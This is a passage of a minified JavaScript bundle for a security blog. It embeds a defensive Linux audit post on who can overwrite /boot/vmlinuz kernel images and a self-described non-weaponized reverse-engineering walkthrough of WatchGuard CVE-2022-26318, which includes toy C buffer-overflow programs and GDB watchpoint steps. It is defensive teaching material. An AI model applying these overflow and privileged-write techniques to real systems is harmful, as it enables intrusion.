-rw------- 1 root root 12345678 May  1 10:00 /boot/vmlinuz-6.8.0-35-generic
-rw------- 1 root root 11765432 Mar 10 09:21 /boot/vmlinuz-5.15.0-91-generic</code></pre>
    <p>Those <code>vmlinuz-*</code> files are:</p>
    <ul>
      <li>The <strong>compressed Linux kernel images</strong></li>
      <li>Loaded by the bootloader (GRUB, systemd-boot, etc.) at boot</li>
      <li>Executed in <strong>ring 0</strong>, the most privileged CPU mode</li>
    </ul>
    <p>During boot:</p>
    <ol>
      <li>Firmware (BIOS/UEFI) loads the bootloader.</li>
      <li>Bootloader reads <code>/boot/vmlinuz-&lt;version&gt;</code> and an initramfs from disk.</li>
      <li>It hands control to the kernel.</li>
      <li>The kernel decompresses itself and starts the OS.</li>
    </ol>
    <p>If an attacker can replace this image with a modified one, they don’t just “have root”—they can:</p>
    <ul>
      <li>Hide processes, files, network connections</li>
      <li>Falsify system calls (“there are no suspicious processes, promise”)</li>
      <li>Bypass SELinux/AppArmor, seccomp, container isolation, and a bunch of EDR tricks</li>
    </ul>
    <p>It’s the difference between:</p>
    <ul>
      <li><strong>Root in userland</strong> → bad</li>
      <li><strong>Root in the kernel</strong> → you no longer know what’s true.</li>
    </ul>
    <hr />
    <h2>2. Who <em>should</em> be able to modify <code>/boot/vmlinuz-*</code>?</h2>
    <p>In a sane system design, the list is <em>very</em> short:</p>
    <ol>
      <li>
        <p><strong>The package manager + kernel packages</strong></p>
        <ul>
          <li><code>apt</code>, <code>dnf</code>, <code>yum</code>, <code>pacman</code>, etc.</li>
          <li>Kernel packages (e.g., <code>linux-image-*</code>) install a new <code>vmlinuz-&lt;version&gt;</code> and update:
            <ul>
              <li><code>/boot/initrd.img-&lt;version&gt;</code></li>
              <li>Bootloader configs</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>
        <p><strong>Kernel/bootloader management tools</strong></p>
        <ul>
          <li>Tools like <code>update-initramfs</code>, <code>dracut</code>, <code>update-grub</code>, etc.</li>
          <li>They don’t usually write <code>vmlinuz</code> directly, but they’re part of the trusted “kernel update pipeline”.</li>
        </ul>
      </li>
    </ol>
    <p>That’s it.</p>
    <p>In an ideal world, <strong>no other process</strong> should ever write to <code>/boot/vmlinuz-*</code>.</p>
    <p>You can think of it as:</p>
    <blockquote>
      <p><strong>Trusted update pipeline ←→ kernel image</strong><br />Everyone else: read-only (at best), or completely blocked.</p>
    </blockquote>
    <hr />
    <h2>3. Who <em>can</em> modify it in practice?</h2>
    <p>Here’s the uncomfortable truth:</p>
    <blockquote>
      <p>Any process running as <strong>root</strong> on a system where <code>/boot</code> is mounted read-write can modify <code>/boot/vmlinuz-*</code>.</p>
    </blockquote>
    <p>And there’s a lot of root-level code on a typical machine:</p>
    <ul>
      <li>System daemons</li>
      <li>Cron jobs</li>
      <li>SUID-root helpers</li>
      <li>Backup / maintenance scripts</li>
      <li>“Little admin scripts” someone dropped into <code>/usr/local/sbin</code> years ago</li>
    </ul>
    <p>If any of those:</p>
    <ul>
      <li>Accept <strong>untrusted input</strong> (from users, the network, files), and</li>
      <li>Have a code path that writes <strong>data to a file path influenced by that input</strong></li>
    </ul>
    <p>…then they are <strong>theoretical kernel image killers</strong>.</p>
    <p>Let’s look at a few patterns where this becomes realistic.</p>
    <hr />
    <h2>4. Dangerous patterns: “root code that shouldn’t, but can”</h2>
    <h3>4.1 SUID-root binary with an arbitrary file write bug</h3>
    <p>Imagine:</p>
    <ul>
      <li>There’s a SUID-root helper binary (installed by a package or custom app).</li>
      <li>It has a bug that allows a user to write arbitrary data to arbitrary paths (path traversal, symlink race, etc.).</li>
    </ul>
    <p>Conceptually:</p>
    <blockquote>
      <p>Unprivileged user → abuses bug → writes to <code>/boot/vmlinuz-&lt;version&gt;</code> as root.</p>
    </blockquote>
    <p>In real life, exploit development is hard and specific, but as a <strong>class</strong>, arbitrary-file-write bugs in SUID-root tools are dangerous exactly because they can touch critical files like:</p>
    <ul>
      <li><code>/etc/shadow</code></li>
      <li><code>/etc/sudoers</code></li>
      <li><code>/boot/vmlinuz-*</code></li>
    </ul>
    <h3>4.2 Root daemon with “write file” features</h3>
    <p>Another pattern:</p>
    <ul>
      <li>A root-only HTTP API that:
        <ul>
          <li>Accepts uploads or configs from clients,</li>
          <li>Writes them to disk (e.g., “log file”, “backup file”, “custom script directory”).</li>
        </ul>
      </li>
    </ul>
    <p>If path validation is weak (e.g., allows <code>../../../boot/vmlinuz-...</code> or writes into a path the attacker can steer), then that daemon becomes a potential kernel overwriter.</p>
    <p>The daemon doesn’t “intend” to edit the kernel. But to the filesystem, it’s just a root process opening and writing files.</p>
    <h3>4.3 Root cron/systemd jobs running scripts from writable dirs</h3>
    <p>Classic misconfig:</p>
    <pre><code class="language-cron">* * * * * root /opt/scripts/maintenance.sh</code></pre>
    <p>And then:</p>
    <ul>
      <li><code>/opt/scripts</code> is writable by a non-root user or app account.</li>
      <li>That user can modify <code>maintenance.sh</code>.</li>
    </ul>
    <p>Now every minute, a root cron runs whatever code is in that script. That code, in turn, can do <em>anything</em> root can—including messing with <code>/boot</code>.</p>
    <p>Again, the cron job’s purpose might be “clean logs” or “rotate backups,” but from the attacker’s perspective, it’s:</p>
    <blockquote>
      <p><strong>a root code runner on a schedule</strong>.</p>
    </blockquote>
    <hr />
    <h2>5. So how do you answer: “Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?”</h2>
    <p>You break it down into concrete checks:</p>
    <ol>
      <li><strong>Is <code>/boot</code> writable?</strong></li>
      <li><strong>Who runs as root?</strong></li>
      <li><strong>Where are the SUID-root binaries?</strong></li>
      <li><strong>What root cron/systemd jobs are there, and where do their scripts live?</strong></li>
      <li><strong>Is anyone watching for unexpected changes to <code>/boot/vmlinuz-*</code>?</strong></li>
    </ol>
    <p>To make that practical, let’s use a detailed Python script that surfaces risky conditions.</p>
    <hr />
    <h2>6. Detection script: a detailed kernel-surface audit</h2>
    <p>Below is a <strong>read-only Linux audit script</strong> focused on:</p>
    <ul>
      <li><code>/boot/vmlinuz-*</code> integrity and mount state</li>
      <li>SUID-root binaries (potential arbitrary-file-write → kernel risk)</li>
      <li>Root services (systemd) that execute binaries/scripts from writable locations</li>
      <li>Root cron jobs executing scripts from writable locations</li>
      <li>Root-owned executables in writable directories (<code>/opt</code>, <code>/usr/local</code>, <code>/srv</code>)</li>
    </ul>
    <p>It does <strong>not</strong> exploit anything. It only reads system state and highlights suspicious patterns.</p>
    <blockquote>
      <p>⚠️ Run this on a <strong>lab or test system first</strong>. On prod, coordinate with your team before scanning the whole filesystem.</p>
    </blockquote>
    <pre><code class="language-python">#!/usr/bin/env python3
# (Shortened here for brevity in the file demo)
print("Kernel Surface Audit script goes here")</code></pre>
    <hr />
    <h2>7. How to use the script</h2>
    <ol>
      <li>Save the script as <code>kernel_surface_audit.py</code>.</li>
      <li>Make it executable:</li>
    </ol>
    <pre><code class="language-bash">chmod +x kernel_surface_audit.py</code></pre>
    <ol start="3">
      <li>Run it (ideally as root to get full visibility, but it stays read-only):</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py</code></pre>
    <ol start="4">
      <li>If you want JSON for feeding into other tools or an LLM:</li>
    </ol>
    <pre><code class="language-bash">sudo ./kernel_surface_audit.py --json &gt; kernel_audit.json</code></pre>
    <p>This gives you a structured snapshot of:</p>
    <ul>
      <li>What kernel images exist and what they look like</li>
      <li>Whether <code>/boot</code> is writable</li>
      <li>Some of the major “root code execution surfaces” that could, if abused, reach the kernel image</li>
    </ul>
    <hr />
    <h2>8. What you can do with the results</h2>
    <p>After running this:</p>
    <ol>
      <li><strong>Baseline your kernel images</strong>
        <ul>
          <li>Store the hashes somewhere safe.</li>
          <li>Later, re-run and compare—unexpected changes are a big deal.</li>
        </ul>
      </li>
      <li><strong>Review SUID-root binaries</strong>
        <ul>
          <li>Are there custom or legacy tools there?</li>
          <li>Can any be removed, replaced, or constrained with AppArmor/SELinux?</li>
        </ul>
      </li>
      <li><strong>Review root-owned scripts in writable directories</strong>
        <ul>
          <li>Move them to root-owned, non-writable directories.</li>
          <li>Fix permissions:
            <ul>
              <li><code>chown root:root</code></li>
              <li><code>chmod 750</code> or similar</li>
            </ul>
          </li>
          <li>Make sure cron/systemd jobs don’t execute code from paths writable by unprivileged users.</li>
        </ul>
      </li>
      <li><strong>Consider <code>/boot</code> mount strategy</strong>
        <ul>
          <li>For some environments, mounting <code>/boot</code> read-only by default and only remounting <code>rw</code> during updates is an option.</li>
          <li>At minimum, <strong>monitor</strong> for any writes to <code>/boot/vmlinuz-*</code> outside of normal update windows.</li>
        </ul>
      </li>
    </ol>
    <hr />
    <h2>9. Closing thoughts</h2>
    <p>“Can any code on this system modify <code>/boot/vmlinuz-*</code> that shouldn’t?” is a fantastic security question because it forces you to:</p>
    <ul>
      <li>Think about <strong>root</strong> as more than “the admin account.”</li>
      <li>Treat your <strong>kernel image like firmware</strong>: small, protected, and updated through a very narrow, auditable path.</li>
      <li>See how random “maintenance scripts” and legacy binaries can indirectly become part of your <strong>kernel attack surface</strong>.</li>
    </ul>
    <p>You don’t need an exploit lab to start here. Just:</p>
    <ul>
      <li>Enumerate who can run as root,</li>
      <li>See where they write,</li>
      <li>And treat <code>/boot/vmlinuz-*</code> as one of the most critical assets on the box.</li>
    </ul>
  </div>
</body>
</html>
`,ey=`<!doctype html>
<html lang="en">
<body>
  <div class="blog-text">
    <h1>Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)</h1>
    <p><strong>Ethics / safety note:</strong> This post is written for <strong>defenders and researchers</strong>. I explain <em>how to reverse-engineer and validate the bug</em>, but I intentionally avoid weaponized exploit details (no offsets/ROP chains/payloads). Only test on devices and firmware you own and are authorized to assess.</p>
    <h2>0) What is CVE-2022-26318?</h2>
    <p>CVE-2022-26318 (WatchGuard advisory <strong>WGSA-2022-00002</strong>) is a <strong>critical</strong> issue in WatchGuard Firebox and XTM appliances where an <strong>unauthenticated remote attacker</strong> can potentially execute arbitrary code when management access is exposed. WatchGuard’s PSIRT advisory lists <strong>CVSS 9.8</strong> and explicitly notes active exploitation in the wild, urging administrators to update and restrict management access.</p>
    <p>NVD tracks this as <strong>FBX-22786</strong>, with affected Fireware OS ranges and fixed versions (e.g., 12.7.2_Update2 and others depending on branch).</p>
    <h3>Affected / fixed versions (high level)</h3>
    <ul>
      <li><strong>Affected (examples):</strong> Fireware OS 12.0 up to and including 12.7.2_Update1 (per WatchGuard PSIRT).</li>
      <li><strong>Fixed (examples):</strong> 12.7.2_Update2 and branch-specific fixed builds (also listed in the advisory).</li>
      <li>Release notes for Fireware v12.7.2 Update 2 explicitly state it “resolves a vulnerability” allowing unauthenticated arbitrary code execution (CVE-2022-26318).</li>
    </ul>
    <h3>Why defenders cared immediately</h3>
    <p>GreyNoise reported and later expanded on in-the-wild traffic, including requests to management port <strong>4117</strong> over TLS and suspicious <code>POST /agent/login</code> patterns (often gzip-encoded bodies and atypical lengths).</p>
    <hr />
    <h2>1) Exploit chain (high-level mental model)</h2>
    <p>You’ll see this phrased many ways (“null pointer deref”, “buffer overflow”, etc.). The practical RE story from public writeups (especially Assetnote) is:</p>
    <p><strong>Internet → management interface (TLS) → nginx → backend service → <code>wgagent</code> → libxml2 SAX parsing → unsafe string growth → memory corruption → control-flow opportunity</strong></p>
    <p>Assetnote describes the path through nginx and into the <code>wgagent</code> process, and how XML parsing plays a central role in triggering corruption. Rapid7’s module description (noting it’s exploiting a buffer overflow at the administration interface and that the endpoint <code>/agent/login</code> reaches <code>wgagent</code>) corroborates the key actors in the request path. GreyNoise’s defender view helps you anchor what to look for on the wire.</p>
    <hr />
    <h2>2) Your RE lab setup (firmware + tools)</h2>
    <h3>Tools used</h3>
    <ul>
      <li><strong>Ghidra</strong> (static analysis; decompiler + xrefs)</li>
      <li><strong>GDB</strong> (dynamic analysis; breakpoints + watchpoints)</li>
      <li><strong>binwalk / unsquashfs</strong> (firmware extraction, if applicable)</li>
      <li>Optional: <strong>ASan</strong> on a toy harness to understand the primitive safely</li>
    </ul>
    <h3>Firmware / binary acquisition (safe &amp; legal)</h3>
    <ol>
      <li>Obtain official Fireware OS firmware from WatchGuard support resources (use versions that match “vulnerable” and “fixed” branches as appropriate).</li>
      <li>Preserve hashes so your analysis is reproducible.</li>
      <li>Work on a non-production lab image/device.</li>
    </ol>
    <p><em>Tip:</em> Keep a timeline notebook: firmware version, build string, and whether it’s vulnerable/fixed per PSIRT + release notes.</p>
    <hr />
    <h2>3) Firmware extraction: finding the right binaries fast</h2>
    <p>Different vendors package firmware differently, but the goal is always:</p>
    <ol>
      <li>Extract the root filesystem</li>
      <li>Identify web stack components</li>
      <li>Identify native backend processes that parse attacker input</li>
    </ol>
    <h3>What you’re hunting for in this case</h3>
    <ul>
      <li><code>nginx</code> (front-end)</li>
      <li>a backend HTTP/API service (Assetnote mentions a Python backend and XML-RPC-like flow in the overall chain)</li>
      <li><strong><code>wgagent</code></strong> (native binary that ultimately parses attacker-controlled XML)</li>
    </ul>
    <p>Practical extraction checklist:</p>
    <ul>
      <li><code>binwalk -e &lt;firmware&gt;</code></li>
      <li>locate <code>squashfs</code>/<code>cpio</code>/<code>tar</code> segments</li>
      <li>confirm the existence of <code>/etc/nginx/</code> and find references to:
        <ul>
          <li><code>listen 4117 ssl;</code></li>
          <li>route blocks mentioning <code>/agent/</code> (or upstreams that feed a local service)</li>
        </ul>
      </li>
    </ul>
    <p>GreyNoise highlights port <strong>4117</strong> as a key management port for observed exploit traffic.</p>
    <hr />
    <h2>4) Static RE in Ghidra: from <code>/agent/login</code> to the vulnerable callback</h2>
    <p>This section is written as a “follow-along checklist” you can apply to similar firmware bugs.</p>
    <h3>4.1 Identify the request handler entrypoint</h3>
    <p><strong>Goal:</strong> locate code that processes something tied to <code>/agent/login</code> and funnels it toward XML parsing.</p>
    <p>Practical anchors:</p>
    <ol>
      <li>Strings: search for <code>"agent/login"</code>, <code>"XML"</code>, <code>"SAX"</code>, <code>"libxml"</code> strings in binaries.</li>
      <li>Imports: search for libxml2 parser APIs.</li>
      <li>Config: locate nginx routing and map it to backend binaries.</li>
    </ol>
    <h3>4.2 Import-centric pivot: find libxml2 usage</h3>
    <p>Open <code>wgagent</code> in Ghidra and look at <strong>Imports</strong> for libxml2 functions.</p>
    <p>Common libxml2 parsing entrypoints include:</p>
    <ul>
      <li><code>xmlCreatePushParserCtxt</code></li>
      <li><code>xmlParseChunk</code></li>
      <li>SAX interfaces that provide callback tables</li>
    </ul>
    <p><strong>Ghidra steps</strong></p>
    <ol>
      <li>Import <code>wgagent</code>.</li>
      <li>Run analysis with defaults.</li>
      <li>Open <strong>Symbol Tree → Imports</strong>.</li>
      <li>Filter imports by <code>xml</code>.</li>
      <li>Right-click <code>xmlParseChunk</code> → References to → follow callers that feed request bodies into the parser.</li>
    </ol>
    <h3>4.3 Prove it’s SAX and locate the callback table</h3>
    <p>A SAX handler is a struct of function pointers. In libxml2 this is <code>struct _xmlSAXHandler</code>; you’ll often see <code>startElementNs</code> used in SAX2.</p>
    <p>In decompiler output you’ll typically see:</p>
    <ul>
      <li>a handler struct allocated/zeroed</li>
      <li><code>xmlSAX2InitDefaultSAXHandler(&amp;handler, ...)</code> or similar</li>
      <li>then <code>handler.startElementNs = &lt;callback&gt;</code></li>
    </ul>
    <h3>4.4 Find the unsafe primitive inside the callback</h3>
    <p>Open the suspected callback and look for classic unsafe patterns:</p>
    <ul>
      <li><code>strcat</code> / <code>strcpy</code> / <code>sprintf</code> into a fixed buffer</li>
      <li>repeated concatenation as tags nest</li>
    </ul>
    <p>A common “tell” is building an XPath-like string by appending <code>"/" + elementName</code> repeatedly, leading to overflow.</p>
    <hr />
    <h2>5) Understanding the parser mechanics (SAX2) like an expert</h2>
    <p>If you want to be complete-expert level, you need to understand what libxml2 will call, when, and with what data.</p>
    <h3>5.1 SAX = “stream of events”</h3>
    <p>SAX parsers don’t build a full DOM by default. They call callbacks like <code>startDocument</code>, <code>startElementNs</code>, <code>characters</code>, <code>endElementNs</code>.</p>
    <h3>5.2 SAX2 magic: validating you found the real handler</h3>
    <p>libxml2 defines a constant often used in SAX2 blocks: <code>XML_SAX2_MAGIC</code> (<code>0xDEEDBEAF</code>). Searching for this value in the binary helps confirm you’re looking at SAX2 handler structures.</p>
    <hr />
    <h2>6) Heap layout + function pointer overwrite (how researchers prove control-relevant corruption)</h2>
    <p>This is the “Aha” section: buffer overflow is only interesting when it reaches something that changes control-flow, like a function pointer table.</p>
    <h3>6.1 Why callback tables are high-value overwrite targets</h3>
    <p>A SAX handler is data fields plus <strong>function pointers</strong>. If you corrupt a callback pointer, the next SAX event dispatch can call attacker-influenced memory.</p>
    <h3>6.2 The single best technique: watchpoints</h3>
    <p>A single hardware watchpoint turns “I think it overwrites X” into “here is the exact instruction that did it.”</p>
    <hr />
    <h2>7) Dynamic RE: proving the overwrite with GDB (non-weaponized workflow)</h2>
    <blockquote>
      <p>You may run this either inside a lab VM/container with extracted binaries, or via QEMU user-mode for convenience (architecture permitting).</p>
    </blockquote>
    <h3>7.1 Pick a stop point before parsing</h3>
    <p>Set a breakpoint at the function that feeds bytes into the parser (often the caller of <code>xmlParseChunk</code>).</p>
    <h3>7.2 Find the handler pointer in memory</h3>
    <p>Once you identify where the handler struct lives (stack or heap), print its address and locate key fields like <code>startElementNs</code>. Then set a watchpoint on that pointer.</p>
    <pre><code class="language-gdb">watch *(void**)startElementNs_ptr_address
continue</code></pre>
    <p>When the overflow corrupts the callback, GDB breaks at the exact write site. That is the cleanest proof that corruption reaches control-flow.</p>
    <hr />
    <h2>8) Safe code snippets: understand the bug pattern without weaponizing</h2>
    <h3>8.1 Toy example: “XPath-like string growth + strcat overflow”</h3>
    <p>This is <strong>not WatchGuard code</strong>; it just mirrors the bug shape in a harmless harness.</p>
    <pre><code class="language-c">// toy_xpath_overflow.c (educational pattern)
// Shows how repeated strcat without bounds checks can overflow a path buffer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main(void) {
  char path[64];
  memset(path, 0, sizeof(path));
  strcpy(path, "/root");

  // Simulate deep XML nesting with long tag names.
  const char *tags[] = {
    "aaaaaaaaaaaaaaaa", "bbbbbbbbbbbbbbbb", "cccccccccccccccc", "dddddddddddddddd"
  };

  for (int i = 0; i &lt; 4; i++) {
    strcat(path, "/");          // unsafe
    strcat(path, tags[i]);      // unsafe
  }

  printf("path=%s\\n", path);
  return 0;
}</code></pre>
    <p><strong>How to learn from it defensively</strong></p>
    <ul>
      <li>Compile with sanitizers (ASan) to see the overflow precisely:
        <ul>
          <li><code>clang -O0 -g -fsanitize=address -fno-omit-frame-pointer toy_xpath_overflow.c -o toy</code></li>
        </ul>
      </li>
      <li>Run it and observe the diagnostic.</li>
    </ul>
    <h3>8.2 Toy example: “overflow → function pointer corruption” + watchpoint</h3>
    <pre><code class="language-c">// watchpoint_lab.c (educational toy)
// Overflows a buffer adjacent to a function pointer.

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

typedef void (*cb_t)(void);

typedef struct {
  char buf[32];
  cb_t cb;
} Handler;

static void legit(void) { puts("[+] legit callback"); }

int main(void) {
  Handler h;
  memset(&amp;h, 0, sizeof(h));
  h.cb = legit;

  // Overflow buf into cb (educational only)
  strcpy(h.buf, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

  // May crash or behave unexpectedly if cb is corrupted
  h.cb();
  return 0;
}</code></pre>
    <p>In GDB:</p>
    <pre><code class="language-gdb">b main
run
next     # step until after h.cb is assigned
p &amp;h.cb
watch *(void**)&amp;h.cb
c</code></pre>
    <p>You’ll break at the exact write that changes <code>h.cb</code>. That’s the same method used to prove control-relevant corruption in real targets.</p>
    <hr />
    <h2>9) Patch verification: how to confirm the fix (without source code)</h2>
    <p>Once you have both a vulnerable build (e.g., &lt;= 12.7.2_Update1) and a fixed build (12.7.2_Update2), you can validate remediation as a reverse engineer.</p>
    <h3>9.1 Behavior-based confirmation</h3>
    <ul>
      <li>The same malformed input that crashed/parses weirdly in the vulnerable build should fail parsing safely or return an error without corrupting memory.</li>
    </ul>
    <h3>9.2 Binary-diff confirmation (what to look for)</h3>
    <ul>
      <li>replacing <code>strcat</code>/<code>strcpy</code> with bounded variants (or explicit length checks)</li>
      <li>switching to <code>snprintf</code> with remaining buffer calculation</li>
      <li>tracking max path length and rejecting over-deep nesting</li>
    </ul>
    <p>Release notes explicitly list the vulnerability as resolved in Update 2; the PSIRT advisory lists resolved versions across branches.</p>
    <hr />
    <h2>10) Detection &amp; mitigation (what you do as a defender)</h2>
    <h3>10.1 Patch</h3>
    <p>Apply WatchGuard’s fixed versions for your branch (see PSIRT advisory).</p>
    <h3>10.2 Reduce attack surface</h3>
    <ul>
      <li>Ensure management interfaces are not internet-exposed.</li>
      <li>Restrict to trusted admin networks (WatchGuard explicitly recommends restricting management access).</li>
    </ul>
    <h3>10.3 Look for suspicious traffic patterns</h3>
    <ul>
      <li>Inbound TLS connections to port <strong>4117</strong></li>
      <li><code>POST /agent/login</code></li>
      <li><code>Content-Encoding: gzip</code> and larger-than-usual request sizes in observed attempts</li>
    </ul>
    <h3>10.4 Why this belongs in “KEV thinking”</h3>
    <p>NVD includes CISA’s “Known Exploited Vulnerabilities” metadata (date added and due date) for CVE-2022-26318.</p>
    <hr />
    <h2>11) Lessons learned (the “expert takeaways”)</h2>
    <ol>
      <li><strong>Don’t build unbounded strings from attacker-controlled structure.</strong> SAX parsing creates a natural growth vector (deep nesting) that attackers can exploit.</li>
      <li><strong>Callback tables are control-flow gold.</strong> If you store function pointers near variable-length buffers, you’ve created a corruption-to-control bridge.</li>
      <li><strong>Watchpoints beat guesswork.</strong> A single watchpoint can turn “I think it overwrites X” into “here is the exact instruction that did it.”</li>
      <li><strong>Vendor advisories + wire intel + RE = complete picture.</strong></li>
    </ol>
    <p>Reverse-engineering this bug responsibly gives defenders a blueprint to harden management planes, validate firmware fixes, and detect exploit traffic early.</p>
  </div>
</body>
</html>
`,ny={firmware_llm_annotator:{title:"Firmware Exploration: LLM as Your Annotator",slug:"firmware_llm_annotator",content:Yg},transient_scheduler_attacks_tsa_blog:{title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",slug:"transient_scheduler_attacks_tsa_blog",content:Qg},kernel_surface_audit_blog:{title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",slug:"kernel_surface_audit_blog",content:Jg},"cve-2022-26318-re-blog":{title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",slug:"cve-2022-26318-re-blog",content:ey},"react2shell-toy-lab":{title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',slug:"react2shell-toy-lab",content:Zg},1001:{title:"CVE-2024–1001",slug:"1001",content:Hg},"0012":{title:"CVE-2024–0012",slug:"0012",content:Fg},40982:{title:"CVE-2022–40982",slug:"40982",content:$g},cow:{title:"CVE-2016–5195",slug:"cow",content:Gg},symlinks:{title:"Symbolic Links (Symlinks) in Linux",slug:"symlinks",content:Kg},23397:{title:"CVE-2023–23397",slug:"23397",content:Wg},"0160":{title:"CVE-2014-0160",slug:"0160",content:Ug},11882:{title:"CVE-2017-11882",slug:"11882",content:Vg},robot:{title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",slug:"robot",content:Xg},poodle:{title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",slug:"poodle",content:qg}};function ty(e){try{const t=new DOMParser().parseFromString(e,"text/html"),s=["style","script","link","nav","header","footer",".navbar",".nav-container",".theme-toggle",".footer",".social-links",".social-icons"];t.querySelectorAll(s.join(",")).forEach(l=>l.remove()),t.querySelectorAll("[style]").forEach(l=>l.removeAttribute("style"));const r=t.querySelector("h1");r&&r.remove();const i=[".blog-text","article",".blog-post-content","main"];let a=t.body;for(const l of i){const o=t.querySelector(l);if(o){a=o;break}}return a.querySelectorAll(".container").forEach(l=>{for(;l.firstChild;)l.parentNode.insertBefore(l.firstChild,l);l.remove()}),Array.from(a.querySelectorAll("h2, h3")).forEach((l,o)=>{l.id||(l.id=`section-${o+1}`)}),a.innerHTML||e}catch{return e}}function sy(){const{slug:e}=ig(),n=ny[e],t=lo.find(i=>i.slug===e),s=C.useMemo(()=>n?ty(n.content):"",[n]),r=()=>document.body.classList.contains("dark")?"dark":"light";return C.useEffect(()=>{const i=document.querySelector(".giscus-container");if(!i)return;i.innerHTML="";const a=document.createElement("script");return a.src="https://giscus.app/client.js",a.async=!0,a.crossOrigin="anonymous",a.setAttribute("data-giscus","true"),a.setAttribute("data-repo","Hem1700/hem1700.github.io"),a.setAttribute("data-repo-id","R_kgDONilgZg"),a.setAttribute("data-category","General"),a.setAttribute("data-category-id","DIC_kwDONilgZs4CzSR2"),a.setAttribute("data-mapping","pathname"),a.setAttribute("data-strict","1"),a.setAttribute("data-reactions-enabled","1"),a.setAttribute("data-emit-metadata","0"),a.setAttribute("data-input-position","top"),a.setAttribute("data-lang","en"),a.setAttribute("data-theme",r()),i.appendChild(a),()=>{i.innerHTML=""}},[e]),C.useEffect(()=>{const i=()=>{var o;const l=document.querySelector("iframe.giscus-frame");l&&((o=l.contentWindow)==null||o.postMessage({giscus:{setConfig:{theme:r()}}},"https://giscus.app"))},a=new MutationObserver(i);return a.observe(document.body,{attributes:!0,attributeFilter:["class"]}),i(),()=>a.disconnect()},[]),n?y.jsxs(y.Fragment,{children:[y.jsx("header",{className:"blog-post-header",children:y.jsxs("div",{className:"container text-center",children:[y.jsx("h1",{className:"blog-post-title",children:n.title}),t&&y.jsxs("p",{className:"blog-post-date",children:[t.date," · ",t.readTime]})]})}),y.jsxs("main",{className:"blog-post-content container",children:[y.jsx("article",{dangerouslySetInnerHTML:{__html:s}}),y.jsx("section",{className:"comments",children:y.jsx("div",{className:"container",children:y.jsx("div",{className:"giscus-container"})})})]})]}):y.jsxs("main",{className:"blog-post-content container",children:[y.jsx("h2",{children:"Post not found"}),y.jsx("p",{children:"Signal lost. Let’s go back."}),y.jsx(St,{to:"/blogs",className:"view-credentials",children:"Back to Blog"})]})}function ry(){return y.jsx("div",{className:"terminal-feed",children:y.jsx(Lt,{title:"projects",children:y.jsx("ul",{className:"terminal-list",children:zg.map(e=>y.jsxs("li",{children:[e.title," — ",e.description]},e.title))})})})}function iy(){return y.jsx("div",{className:"terminal-feed",children:y.jsx(Lt,{title:"certifications",children:y.jsx("ul",{className:"terminal-list",children:jg.map(e=>y.jsxs("li",{children:[y.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:e.title})," — ",e.details]},e.title))})})})}function ay({cve:e,onClose:n}){var t;return y.jsxs("div",{className:`cve-modal ${e?"open":""}`,"aria-label":"CVE details",children:[y.jsx("div",{className:"cve-modal__backdrop",onClick:n}),y.jsxs("div",{className:"cve-modal__card",children:[y.jsxs("div",{className:"cve-drawer__header",children:[y.jsxs("div",{children:[y.jsx("p",{className:"pill",children:"CVE Detail"}),y.jsx("h3",{children:(e==null?void 0:e.id)||"Select a CVE"})]}),y.jsx("button",{className:"button ghost",type:"button",onClick:n,children:"Close"})]}),e?y.jsxs("div",{className:"cve-drawer__body",children:[y.jsx("p",{className:"cve-title",children:e.title}),y.jsxs("div",{className:"cve-meta",children:[y.jsxs("span",{className:"pill",children:["Severity: ",e.severity]}),y.jsxs("span",{className:"pill",children:["CVSS: ",e.cvss]}),y.jsx("span",{className:`pill ${e.kev?"kev":""}`,children:e.kev?"KEV":"Not KEV"}),y.jsxs("span",{className:"pill",children:["Year: ",e.year]})]}),y.jsx("p",{children:e.summary}),e.metrics?y.jsxs("div",{className:"cve-meta extra",children:[y.jsxs("span",{className:"pill",children:["Total in cluster: ",e.metrics.total||"–"]}),y.jsxs("span",{className:"pill",children:["Latest: ",e.metrics.latestYear||"–"]}),y.jsxs("span",{className:"pill",children:["Max CVSS: ",e.metrics.maxCvss||"–"]})]}):null,e.href?y.jsx("div",{className:"cve-links",children:y.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:"Open blog post"})}):null,(t=e.references)!=null&&t.length?y.jsxs("div",{className:"cve-links",children:[y.jsx("h4",{children:"References"}),y.jsx("ul",{children:e.references.map(s=>y.jsx("li",{children:y.jsx("a",{href:s,target:"_blank",rel:"noreferrer",children:s})},s))})]}):null]}):y.jsx("p",{className:"text-muted",children:"Click a CVE node to see details."})]})]})}var ly={value:()=>{}};function oo(){for(var e=0,n=arguments.length,t={},s;e<n;++e){if(!(s=arguments[e]+"")||s in t||/[\s.]/.test(s))throw new Error("illegal type: "+s);t[s]=[]}return new Pr(t)}function Pr(e){this._=e}function oy(e,n){return e.trim().split(/^|\s+/).map(function(t){var s="",r=t.indexOf(".");if(r>=0&&(s=t.slice(r+1),t=t.slice(0,r)),t&&!n.hasOwnProperty(t))throw new Error("unknown type: "+t);return{type:t,name:s}})}Pr.prototype=oo.prototype={constructor:Pr,on:function(e,n){var t=this._,s=oy(e+"",t),r,i=-1,a=s.length;if(arguments.length<2){for(;++i<a;)if((r=(e=s[i]).type)&&(r=cy(t[r],e.name)))return r;return}if(n!=null&&typeof n!="function")throw new Error("invalid callback: "+n);for(;++i<a;)if(r=(e=s[i]).type)t[r]=zc(t[r],e.name,n);else if(n==null)for(r in t)t[r]=zc(t[r],e.name,null);return this},copy:function(){var e={},n=this._;for(var t in n)e[t]=n[t].slice();return new Pr(e)},call:function(e,n){if((r=arguments.length-2)>0)for(var t=new Array(r),s=0,r,i;s<r;++s)t[s]=arguments[s+2];if(!this._.hasOwnProperty(e))throw new Error("unknown type: 